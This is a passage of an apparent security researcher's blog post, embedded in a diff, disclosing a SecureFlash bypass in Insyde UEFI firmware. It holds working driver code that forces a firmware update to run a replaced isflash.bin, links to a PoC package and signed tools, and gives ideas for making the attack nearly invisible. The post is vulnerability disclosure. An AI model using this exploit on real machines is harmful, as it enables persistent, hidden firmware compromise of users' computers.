+</span><span>    </span><span style="color:#b48ead;">if </span><span>(!</span><span style="color:#bf616a;">EFI_ERROR</span><span>(Status)) { 
+</span><span>      </span><span style="color:#65737e;">// Try setting it as special NV+BS+RT+AW variable
+</span><span>      Status = </span><span style="color:#bf616a;">SetCertAsInsydeSpecialVariable</span><span>();
+</span><span>      </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">EFI_ERROR</span><span>(Status)) {
+</span><span>        </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashPoCError6</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, sizeof(Status), &amp;Status);
+</span><span>          
+</span><span>        </span><span style="color:#65737e;">// Set certificate variable back as NV+BS+RT, this will allow to try again next boot
+</span><span>        </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashCertData</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, VariableSize - </span><span style="color:#d08770;">48</span><span>, VariableBuffer + </span><span style="color:#d08770;">48</span><span>);
+</span><span>        </span><span style="color:#b48ead;">return</span><span> Status;
+</span><span>      }
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style="color:#65737e;">// Check if we need to trigger SecureFlash boot, or it was already triggered
+</span><span>    Size = sizeof(SecureFlashInfo);
+</span><span>    Status = </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">GetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashInfo</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, &amp;Attributes, &amp;Size, &amp;SecureFlashInfo);
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(!</span><span style="color:#bf616a;">EFI_ERROR</span><span>(Status)) {
+</span><span>      </span><span style="color:#b48ead;">if </span><span>(SecureFlashInfo.</span><span style="color:#bf616a;">SecureFlashTrigger </span><span>== </span><span style="color:#d08770;">0</span><span>) {
+</span><span>        </span><span style="color:#65737e;">// Fill new SecureFlashInfo
+</span><span>        </span><span style="color:#bf616a;">gBS</span><span>-&gt;</span><span style="color:#bf616a;">SetMem</span><span>(&amp;SecureFlashInfo, sizeof(SecureFlashInfo), </span><span style="color:#d08770;">0</span><span>);
+</span><span>        SecureFlashInfo.</span><span style="color:#bf616a;">SecureFlashTrigger </span><span>= </span><span style="color:#d08770;">1</span><span>; </span><span style="color:#65737e;">// Trigger secure flash on next reboot
+</span><span>        SecureFlashInfo.</span><span style="color:#bf616a;">ImageSize </span><span>= </span><span style="color:#d08770;">1112568</span><span>; </span><span style="color:#65737e;">// Size of our isflash.bin payload
+</span><span>          
+</span><span>        </span><span style="color:#65737e;">// Set the variable to initiate secure flash
+</span><span>        </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">SetVariable</span><span>(</span><span style="color:#b48ead;">L</span><span>&quot;</span><span style="color:#a3be8c;">SecureFlashInfo</span><span>&quot;, &amp;</span><span style="color:#bf616a;">gSecureFlashVariableGuid</span><span>, </span><span style="color:#d08770;">7</span><span>, sizeof(SecureFlashInfo), &amp;SecureFlashInfo);
+</span><span>        
+</span><span>        </span><span style="color:#65737e;">// Reset the system to initiate update
+</span><span>        </span><span style="color:#bf616a;">gRT</span><span>-&gt;</span><span style="color:#bf616a;">ResetSystem</span><span>(EfiResetCold, EFI_SUCCESS, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>      }
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return</span><span> EFI_SUCCESS;
+</span><span>}
+</span></code></pre>
+<p>Now we are finally able to replace the original <em>isflash.bin</em> with something interesting of our own, and get it executed during firmware update process when the flash is not write-protected. Let's have some fun!</p>
+<h1 id="poc-or-gtfo">PoC or GTFO?</h1>
+<p>We got everything in place, so the only thing remaining is to tie it all together with some minor UEFI shell scripting, build and sign everything, and run the <em>sfpoc.cmd</em> from Windows as Administrator. I'm using a custom-cert-signed version of Intel Flash Programming Tool to write our modified BIOS image, and out mod is very simple - replace the default BGRT boot graphics (that says HUAWEI) with our own image (that says ALL YOU BASE ARE BELONG TO US).</p>
+<p><a href="https://www.youtube.com/watch?v=1uJF44S0LQw"><img src="https://img.youtube.com/vi/1uJF44S0LQw/0.jpg" alt="PoC video on YouTube" /></a></p>
+<p>Truly, the DXE volume now belongs to us, and we can add any kind of <a href="https://github.com/LongSoft/CrScreenshotDxe">useful</a> or <a href="https://github.com/Cr4sh/SmmBackdoorNg">malicious</a> drivers in there, and modify the original ones to remove WiFi card whitelists, open hidden BIOS settings, and so on.</p>
+<p>The PoC is also OEM-agnostic in the most part, and if your PC manufacturer decided to use Insyde firmware update subsystem instead of inventing their own, and your BIOS had been built before 2025-06-10, your machine is likely vulnerable. Might need to sign a different version of FPT, and, of course, provide your own modified BIOS region file, and maybe add a reset into the second <em>startup.nsh</em> because not every firmware arms a watchdog before transferring control to <em>isflash.bin</em>, but otherwise it should all work as it does here.</p>
+<p><img src="../hydroph0bia-part2/hp2_aybabtu.jpg" alt="ALL YOU BASE ARE BELONG TO US" /></p>
+<h1 id="outro">Outro</h1>
+<p>There are several hypothesis I'd still like to check, including using VariableLockProtocol from our driver or otherwise making <em>SecureFlashCertData</em> undeletable without jumping around the hooks, as it turns out the DriverXXXX load options are still being processed even in the firmware update mode.</p>
+<p>Another option is to locate EfiBlockDevice protocol in our driver and write to flash directly, bypassing the need to do anything but a reset in our <em>isflash.bin</em> stage. This will make an attack almost invisible (it will resemble a memory training error with multiple resets into a black screen followed by "normal" boot).</p>
+<p>In part 3 we will check out how Insyde fixed the issues I've reported, and if we could do anything with that "fixed" code to regain the capabilities. So far I haven't seen any BIOS update that would have fixed Hydroph0bia, so that will be written and published when OEMs do their part. Stay tuned!</p>
+<h1 id="links">Links</h1>
+<p><a href="https://github.com/NikolajSchlej/Hydroph0bia/tree/main/sfpoc">PoC package</a> for HUAWEI MateBook 14 2023, <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/bios_images/aybabtu_logo.bin">modified BIOS region image</a>, SecureFlashPoC driver <a href="https://github.com/NikolajSchlej/Hydroph0bia/tree/main/SecureFlashPoC">sources</a> and <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/signed/sfpoc_signed.efi">custom-cert-signed binary</a>, and <a href="https://github.com/NikolajSchlej/Hydroph0bia/blob/main/signed/fpt15_signed.efi">custom-cert-signed Intel FPT 15</a> are on GitHub.</p>
+
+
+            </main>
+            <footer>
+                
+<p class="taxonomies">
+
+</p>
+
+                
+            </footer>
+        </div>
+    </body>
+</html>
+        
